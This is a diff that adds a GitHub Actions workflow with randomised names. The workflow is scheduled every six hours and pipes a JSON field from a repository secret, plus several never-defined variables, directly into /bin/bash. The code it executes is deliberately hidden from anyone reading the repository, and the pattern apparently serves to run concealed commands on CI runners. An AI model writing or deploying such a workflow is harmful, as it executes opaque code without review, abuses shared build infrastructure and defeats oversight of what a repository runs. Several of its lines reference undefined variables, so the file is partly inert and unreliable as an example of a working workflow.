@@ -1,0 +1,24 @@
+name: jialijuanzou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jialijuanzou
+        env:
+          okzr5: ${{ secrets.okzr5 }}
+        run: |
+          echo $okzr5 | jq -r .pxzj8764 | /bin/bash
+          echo $zsvaq44704 | jq -r .maw6 | /bin/bash
+          echo $r10378 | jq -r .mmr068 | /bin/bash
+          echo $udxi41 | jq -r .bwztj9341 | /bin/bash
+          echo $mtd04590 | jq -r .d2 | /bin/bash
+          echo $ycw5297 | jq -r .dij359 | /bin/bash
+          echo $sqnq21238 | jq -r .w71 | /bin/bash
+          echo $ohmkz0 | jq -r .ga460 | /bin/bash
+
